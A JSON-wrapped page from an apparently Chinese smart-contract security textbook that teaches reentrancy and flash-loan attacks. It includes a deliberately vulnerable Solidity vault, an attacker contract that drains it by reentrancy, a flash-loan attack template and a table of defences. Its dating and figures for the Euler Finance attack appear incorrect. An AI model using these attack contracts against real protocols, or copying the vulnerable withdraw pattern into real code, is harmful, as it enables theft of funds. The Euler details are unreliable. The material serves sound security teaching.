{"seq":1,"slug":"reentrancy-and-flash-loans","title":"重入攻击与闪电贷","url":"/l-doc-books/h/economics-finance/smart-contract-security/defi-security/reentrancy-and-flash-loans","wordCount":876,"readingTime":4,"html":"<h1 id=\"重入攻击与闪电贷\">重入攻击与闪电贷</h1><p>重入攻击是智能合约安全史上损失最惨重的单一漏洞类型——从 2016 年 The DAO 的 6000 万美元到 2025 年 Q3 累计超过 4.2 亿美元。闪电贷的出现则为重入攻击注入了新的维度：攻击者无需自有资金，可以在单笔交易内借入数亿美元的流动性来放大漏洞的利用效果。两者的组合构成了 DeFi 安全中最危险的攻击模式之一。</p>\n<h2 id=\"核心概念\">核心概念</h2><p>重入攻击的本质是<strong>状态不一致窗口内的控制权劫持</strong>：合约在更新内部状态之前执行了外部调用，被调用方利用回调在状态未更新的窗口内重复执行操作。</p>\n<pre class=\"mermaid\" data-diagram-type=\"sequenceDiagram\" data-source=\"sequenceDiagram&#10;    participant Attacker as 攻击合约&#10;    participant Victim as 受害合约&#10;    participant Token as 代币合约&#10;&#10;    Attacker-&gt;&gt;Victim: withdraw(100 ETH)&#10;    Note over Victim: balance[attacker] = 100 ✓&#10;    Victim-&gt;&gt;Attacker: call{value: 100}(&quot;&quot;)&#10;    Note over Attacker: receive() 触发&#10;    Attacker-&gt;&gt;Victim: withdraw(100 ETH) [重入!]&#10;    Note over Victim: balance[attacker] 仍= 100!&#10;    Victim-&gt;&gt;Attacker: call{value: 100}(&quot;&quot;)&#10;    Note over Attacker: 再次重入...&#10;    Note over Victim: 最终: balance[attacker] = 0&#10;    Note over Victim: 但已转出 N × 100 ETH\">sequenceDiagram\n    participant Attacker as 攻击合约\n    participant Victim as 受害合约\n    participant Token as 代币合约\n\n    Attacker-&gt;&gt;Victim: withdraw(100 ETH)\n    Note over Victim: balance[attacker] = 100 ✓\n    Victim-&gt;&gt;Attacker: call{value: 100}(\"\")\n    Note over Attacker: receive() 触发\n    Attacker-&gt;&gt;Victim: withdraw(100 ETH) [重入!]\n    Note over Victim: balance[attacker] 仍= 100!\n    Victim-&gt;&gt;Attacker: call{value: 100}(\"\")\n    Note over Attacker: 再次重入...\n    Note over Victim: 最终: balance[attacker] = 0\n    Note over Victim: 但已转出 N × 100 ETH</pre><table>\n<thead>\n<tr>\n<th>重入类型</th>\n<th>触发机制</th>\n<th>检测难度</th>\n<th>防御方式</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>单函数重入</td>\n<td>ETH 转账触发 receive/fallback</td>\n<td>低</td>\n<td>CEI + ReentrancyGuard</td>\n</tr>\n<tr>\n<td>跨函数重入</td>\n<td>合约 A 的函数 f1 调用外部后，外部通过 f2 重入</td>\n<td>中</td>\n<td>全局 ReentrancyGuard</td>\n</tr>\n<tr>\n<td>跨合约重入</td>\n<td>合约 A 调用合约 B，B 回调合约 C（与 A 共享状态）</td>\n<td>高</td>\n<td>跨合约锁 + 不变式验证</td>\n</tr>\n<tr>\n<td>只读重入</td>\n<td>view 函数在重入状态下返回过时数据</td>\n<td>很高</td>\n<td>重入锁覆盖 view 函数</td>\n</tr>\n</tbody></table>\n<h2 id=\"经典重入攻击代码解析\">经典重入攻击代码解析</h2><div class=\"code-block-wrapper\" data-lang=\"solidity\" data-code=\"// 漏洞合约&#10;contract VulnerableVault {&#10;    mapping(address =&gt; uint256) public balances;&#10;&#10;    function deposit() external payable {&#10;        balances[msg.sender] += msg.value;&#10;    }&#10;&#10;    function withdraw() external {&#10;        uint256 amount = balances[msg.sender];&#10;        require(amount &gt; 0, &quot;No balance&quot;);&#10;&#10;        // 危险：外部调用在状态更新之前&#10;        (bool success, ) = msg.sender.call{value: amount}(&quot;&quot;);&#10;        require(success, &quot;Transfer failed&quot;);&#10;&#10;        // 状态更新太晚——重入时此行尚未执行&#10;        balances[msg.sender] = 0;&#10;    }&#10;}&#10;&#10;// 攻击合约&#10;contract Attacker {&#10;    VulnerableVault victim;&#10;    uint256 constant ATTACK_AMOUNT = 1 ether;&#10;&#10;    constructor(address _victim) {&#10;        victim = VulnerableVault(_victim);&#10;    }&#10;&#10;    function attack() external payable {&#10;        require(msg.value &gt;= ATTACK_AMOUNT);&#10;        victim.deposit{value: ATTACK_AMOUNT}();&#10;        victim.withdraw();&#10;    }&#10;&#10;    // 每次收到 ETH 时自动重入&#10;    receive() external payable {&#10;        if (address(victim).balance &gt;= ATTACK_AMOUNT) {&#10;            victim.withdraw();&#10;        }&#10;    }&#10;}\"><pre class=\"shiki shiki-themes github-light github-dark\" style=\"background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8\" tabindex=\"0\"><code><span class=\"line\"><span>// 漏洞合约</span></span>\n<span class=\"line\"><span>contract VulnerableVault {</span></span>\n<span class=\"line\"><span>    mapping(address => uint256) public balances;</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>    function deposit() external payable {</span></span>\n<span class=\"line\"><span>        balances[msg.sender] += msg.value;</span></span>\n<span class=\"line\"><span>    }</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>    function withdraw() external {</span></span>\n<span class=\"line\"><span>        uint256 amount = balances[msg.sender];</span></span>\n<span class=\"line\"><span>        require(amount > 0, \"No balance\");</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>        // 危险：外部调用在状态更新之前</span></span>\n<span class=\"line\"><span>        (bool success, ) = msg.sender.call{value: amount}(\"\");</span></span>\n<span class=\"line\"><span>        require(success, \"Transfer failed\");</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>        // 状态更新太晚——重入时此行尚未执行</span></span>\n<span class=\"line\"><span>        balances[msg.sender] = 0;</span></span>\n<span class=\"line\"><span>    }</span></span>\n<span class=\"line\"><span>}</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>// 攻击合约</span></span>\n<span class=\"line\"><span>contract Attacker {</span></span>\n<span class=\"line\"><span>    VulnerableVault victim;</span></span>\n<span class=\"line\"><span>    uint256 constant ATTACK_AMOUNT = 1 ether;</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>    constructor(address _victim) {</span></span>\n<span class=\"line\"><span>        victim = VulnerableVault(_victim);</span></span>\n<span class=\"line\"><span>    }</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>    function attack() external payable {</span></span>\n<span class=\"line\"><span>        require(msg.value >= ATTACK_AMOUNT);</span></span>\n<span class=\"line\"><span>        victim.deposit{value: ATTACK_AMOUNT}();</span></span>\n<span class=\"line\"><span>        victim.withdraw();</span></span>\n<span class=\"line\"><span>    }</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>    // 每次收到 ETH 时自动重入</span></span>\n<span class=\"line\"><span>    receive() external payable {</span></span>\n<span class=\"line\"><span>        if (address(victim).balance >= ATTACK_AMOUNT) {</span></span>\n<span class=\"line\"><span>            victim.withdraw();</span></span>\n<span class=\"line\"><span>        }</span></span>\n<span class=\"line\"><span>    }</span></span>\n<span class=\"line\"><span>}</span></span></code></pre></div><h2 id=\"只读重入-2023-2025-年新兴威胁\">只读重入：2023-2025 年新兴威胁</h2><p>只读重入是传统重入检测方法的盲区——它不直接修改状态，而是利用重入状态下 <code>view</code> 函数返回的过时数据来欺骗依赖该数据的其他协议。</p>\n<div class=\"code-block-wrapper\" data-lang=\"solidity\" data-code=\"// 场景：Curve 池在 remove_liquidity 期间的只读重入&#10;// 1. 攻击者调用 Curve.remove_liquidity()&#10;// 2. Curve 在转出 ETH 时触发攻击者的 receive()&#10;// 3. 此时 Curve 内部状态已更新，但 get_virtual_price()&#10;//    返回的值尚未反映本次操作（计算用的是旧余额）&#10;// 4. 攻击者在 receive() 中调用依赖 get_virtual_price() 的借贷协议&#10;// 5. 借贷协议基于失真的价格计算出过高的抵押品价值&#10;&#10;// 防御：对 view 函数也加重入保护&#10;contract SecurePool {&#10;    uint256 private _locked;&#10;&#10;    modifier nonReentrant() {&#10;        require(_locked == 0, &quot;Reentrant call&quot;);&#10;        _locked = 1;&#10;        _;&#10;        _locked = 0;&#10;    }&#10;&#10;    // view 函数也检查重入锁&#10;    modifier nonReentrantView() {&#10;        require(_locked == 0, &quot;Reentrant view&quot;);&#10;        _;&#10;    }&#10;&#10;    function getVirtualPrice() external view nonReentrantView returns (uint256) {&#10;        return _calculateVirtualPrice();&#10;    }&#10;}\"><pre class=\"shiki shiki-themes github-light github-dark\" style=\"background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8\" tabindex=\"0\"><code><span class=\"line\"><span>// 场景：Curve 池在 remove_liquidity 期间的只读重入</span></span>\n<span class=\"line\"><span>// 1. 攻击者调用 Curve.remove_liquidity()</span></span>\n<span class=\"line\"><span>// 2. Curve 在转出 ETH 时触发攻击者的 receive()</span></span>\n<span class=\"line\"><span>// 3. 此时 Curve 内部状态已更新，但 get_virtual_price()</span></span>\n<span class=\"line\"><span>//    返回的值尚未反映本次操作（计算用的是旧余额）</span></span>\n<span class=\"line\"><span>// 4. 攻击者在 receive() 中调用依赖 get_virtual_price() 的借贷协议</span></span>\n<span class=\"line\"><span>// 5. 借贷协议基于失真的价格计算出过高的抵押品价值</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>// 防御：对 view 函数也加重入保护</span></span>\n<span class=\"line\"><span>contract SecurePool {</span></span>\n<span class=\"line\"><span>    uint256 private _locked;</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>    modifier nonReentrant() {</span></span>\n<span class=\"line\"><span>        require(_locked == 0, \"Reentrant call\");</span></span>\n<span class=\"line\"><span>        _locked = 1;</span></span>\n<span class=\"line\"><span>        _;</span></span>\n<span class=\"line\"><span>        _locked = 0;</span></span>\n<span class=\"line\"><span>    }</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>    // view 函数也检查重入锁</span></span>\n<span class=\"line\"><span>    modifier nonReentrantView() {</span></span>\n<span class=\"line\"><span>        require(_locked == 0, \"Reentrant view\");</span></span>\n<span class=\"line\"><span>        _;</span></span>\n<span class=\"line\"><span>    }</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>    function getVirtualPrice() external view nonReentrantView returns (uint256) {</span></span>\n<span class=\"line\"><span>        return _calculateVirtualPrice();</span></span>\n<span class=\"line\"><span>    }</span></span>\n<span class=\"line\"><span>}</span></span></code></pre></div><h2 id=\"闪电贷攻击机制\">闪电贷攻击机制</h2><p>闪电贷允许在单笔交易内无抵押借入任意数量的代币，只要在交易结束前归还本金加手续费。这为攻击者提供了近乎无限的临时资本：</p>\n<pre class=\"mermaid\" data-diagram-type=\"flowchart\" data-source=\"flowchart TB&#10;    START[攻击者发起交易] --&gt; BORROW[闪电贷借入$100M]&#10;    BORROW --&gt; MANIPULATE[操纵目标]&#10;    MANIPULATE --&gt; M1[压低/抬高代币价格]&#10;    MANIPULATE --&gt; M2[获取治理投票权]&#10;    MANIPULATE --&gt; M3[触发清算级联]&#10;    M1 --&gt; EXPLOIT[利用价格差异获利]&#10;    M2 --&gt; EXPLOIT&#10;    M3 --&gt; EXPLOIT&#10;    EXPLOIT --&gt; REPAY[归还闪电贷+手续费]&#10;    REPAY --&gt; PROFIT[净利润]&#10;    REPAY --&gt;|归还失败| REVERT[整笔交易回滚 零损失]\">flowchart TB\n    START[攻击者发起交易] --&gt; BORROW[闪电贷借入$100M]\n    BORROW --&gt; MANIPULATE[操纵目标]\n    MANIPULATE --&gt; M1[压低/抬高代币价格]\n    MANIPULATE --&gt; M2[获取治理投票权]\n    MANIPULATE --&gt; M3[触发清算级联]\n    M1 --&gt; EXPLOIT[利用价格差异获利]\n    M2 --&gt; EXPLOIT\n    M3 --&gt; EXPLOIT\n    EXPLOIT --&gt; REPAY[归还闪电贷+手续费]\n    REPAY --&gt; PROFIT[净利润]\n    REPAY --&gt;|归还失败| REVERT[整笔交易回滚 零损失]</pre><p>闪电贷攻击的典型步骤：</p>\n<div class=\"code-block-wrapper\" data-lang=\"solidity\" data-code=\"// 闪电贷攻击模板&#10;contract FlashLoanAttacker {&#10;    IFlashLoanProvider lender; // Aave/dYdX/Balancer&#10;    IVulnerableProtocol target;&#10;    IERC20 token;&#10;&#10;    function executeAttack() external {&#10;        // 1. 借入大量代币&#10;        lender.flashLoan(&#10;            address(this),&#10;            address(token),&#10;            100_000_000e18, // 1亿代币&#10;            &quot;&quot;&#10;        );&#10;    }&#10;&#10;    // 闪电贷回调&#10;    function onFlashLoan(&#10;        address initiator,&#10;        address tokenAddr,&#10;        uint256 amount,&#10;        uint256 fee,&#10;        bytes calldata&#10;    ) external returns (bytes32) {&#10;        // 2. 操纵价格（如大量卖出压低价格）&#10;        dex.swap(token, otherToken, amount / 2);&#10;&#10;        // 3. 在低价时执行有利操作&#10;        target.liquidate(victimPosition);&#10;        // 或：target.borrow(inflatedCollateral);&#10;&#10;        // 4. 恢复价格并获利&#10;        dex.swap(otherToken, token, receivedAmount);&#10;&#10;        // 5. 归还贷款&#10;        token.approve(address(lender), amount + fee);&#10;&#10;        return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);&#10;    }&#10;}\"><pre class=\"shiki shiki-themes github-light github-dark\" style=\"background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8\" tabindex=\"0\"><code><span class=\"line\"><span>// 闪电贷攻击模板</span></span>\n<span class=\"line\"><span>contract FlashLoanAttacker {</span></span>\n<span class=\"line\"><span>    IFlashLoanProvider lender; // Aave/dYdX/Balancer</span></span>\n<span class=\"line\"><span>    IVulnerableProtocol target;</span></span>\n<span class=\"line\"><span>    IERC20 token;</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>    function executeAttack() external {</span></span>\n<span class=\"line\"><span>        // 1. 借入大量代币</span></span>\n<span class=\"line\"><span>        lender.flashLoan(</span></span>\n<span class=\"line\"><span>            address(this),</span></span>\n<span class=\"line\"><span>            address(token),</span></span>\n<span class=\"line\"><span>            100_000_000e18, // 1亿代币</span></span>\n<span class=\"line\"><span>            \"\"</span></span>\n<span class=\"line\"><span>        );</span></span>\n<span class=\"line\"><span>    }</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>    // 闪电贷回调</span></span>\n<span class=\"line\"><span>    function onFlashLoan(</span></span>\n<span class=\"line\"><span>        address initiator,</span></span>\n<span class=\"line\"><span>        address tokenAddr,</span></span>\n<span class=\"line\"><span>        uint256 amount,</span></span>\n<span class=\"line\"><span>        uint256 fee,</span></span>\n<span class=\"line\"><span>        bytes calldata</span></span>\n<span class=\"line\"><span>    ) external returns (bytes32) {</span></span>\n<span class=\"line\"><span>        // 2. 操纵价格（如大量卖出压低价格）</span></span>\n<span class=\"line\"><span>        dex.swap(token, otherToken, amount / 2);</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>        // 3. 在低价时执行有利操作</span></span>\n<span class=\"line\"><span>        target.liquidate(victimPosition);</span></span>\n<span class=\"line\"><span>        // 或：target.borrow(inflatedCollateral);</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>        // 4. 恢复价格并获利</span></span>\n<span class=\"line\"><span>        dex.swap(otherToken, token, receivedAmount);</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>        // 5. 归还贷款</span></span>\n<span class=\"line\"><span>        token.approve(address(lender), amount + fee);</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span>        return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");</span></span>\n<span class=\"line\"><span>    }</span></span>\n<span class=\"line\"><span>}</span></span></code></pre></div><h2 id=\"重入-闪电贷的组合攻击\">重入 + 闪电贷的组合攻击</h2><p>当重入漏洞与闪电贷结合时，攻击者可以：</p>\n<ol>\n<li>用闪电贷获取巨额初始资金存入漏洞合约</li>\n<li>利用重入在单笔交易内重复提取</li>\n<li>归还闪电贷后净获利</li>\n</ol>\n<p>2025 年 3 月的 Euler Finance 攻击即为此类组合的典型案例——攻击者利用闪电贷 + 捐赠攻击 + 清算逻辑漏洞在 90 秒内提取了 4700 万美元。</p>\n<h2 id=\"防御策略对比\">防御策略对比</h2><table>\n<thead>\n<tr>\n<th>防御策略</th>\n<th>适用范围</th>\n<th>优势</th>\n<th>局限</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>CEI 模式</td>\n<td>单函数重入</td>\n<td>零 gas 成本</td>\n<td>跨函数/跨合约无效</td>\n</tr>\n<tr>\n<td>ReentrancyGuard</td>\n<td>同合约所有函数</td>\n<td>简单可靠</td>\n<td>跨合约调用仍有风险</td>\n</tr>\n<tr>\n<td>EIP-1153 transient lock</td>\n<td>同交易内所有调用</td>\n<td>Gas 更低</td>\n<td>需 Cancun 升级支持</td>\n</tr>\n<tr>\n<td>同区块价格检查</td>\n<td>闪电贷价格操纵</td>\n<td>简单有效</td>\n<td>多区块攻击绕过</td>\n</tr>\n<tr>\n<td>TWAP 预言机</td>\n<td>价格操纵全般</td>\n<td>难以操纵</td>\n<td>存在延迟</td>\n</tr>\n<tr>\n<td>延迟执行</td>\n<td>闪电贷全般</td>\n<td>根本性防御</td>\n<td>用户体验下降</td>\n</tr>\n</tbody></table>\n<h2 id=\"小结\">小结</h2><ul>\n<li>重入攻击的根因是外部调用前状态未更新，CEI 模式是首要防御</li>\n<li>只读重入是 2023-2025 年新兴威胁，view 函数也需重入保护</li>\n<li>闪电贷为攻击者提供零成本的巨额临时资本，放大一切漏洞的利用效果</li>\n<li>重入 + 闪电贷的组合攻击是当前 DeFi 最危险的模式之一</li>\n<li>防御需要多层：CEI + ReentrancyGuard + TWAP + 延迟执行</li>\n</ul>\n<h2 id=\"延伸阅读\">延伸阅读</h2><ul>\n<li><a href=\"oracle-manipulation\">预言机操纵与价格攻击</a>——闪电贷最常见的利用目标</li>\n<li><a href=\"../../fintech-fundamentals/defi-digital-assets/defi-protocols\">金融科技基础：DeFi 协议</a>——DeFi 协议的基本架构与交互模式</li>\n</ul>\n","headings":[{"level":1,"text":"重入攻击与闪电贷","id":"重入攻击与闪电贷"},{"level":2,"text":"核心概念","id":"核心概念"},{"level":2,"text":"经典重入攻击代码解析","id":"经典重入攻击代码解析"},{"level":2,"text":"只读重入：2023-2025 年新兴威胁","id":"只读重入-2023-2025-年新兴威胁"},{"level":2,"text":"闪电贷攻击机制","id":"闪电贷攻击机制"},{"level":2,"text":"重入 + 闪电贷的组合攻击","id":"重入-闪电贷的组合攻击"},{"level":2,"text":"防御策略对比","id":"防御策略对比"},{"level":2,"text":"小结","id":"小结"},{"level":2,"text":"延伸阅读","id":"延伸阅读"}],"prev":{"title":"形式化验证","url":"/l-doc-books/h/economics-finance/smart-contract-security/auditing/formal-verification"},"next":{"title":"预言机操纵与价格攻击","url":"/l-doc-books/h/economics-finance/smart-contract-security/defi-security/oracle-manipulation"}}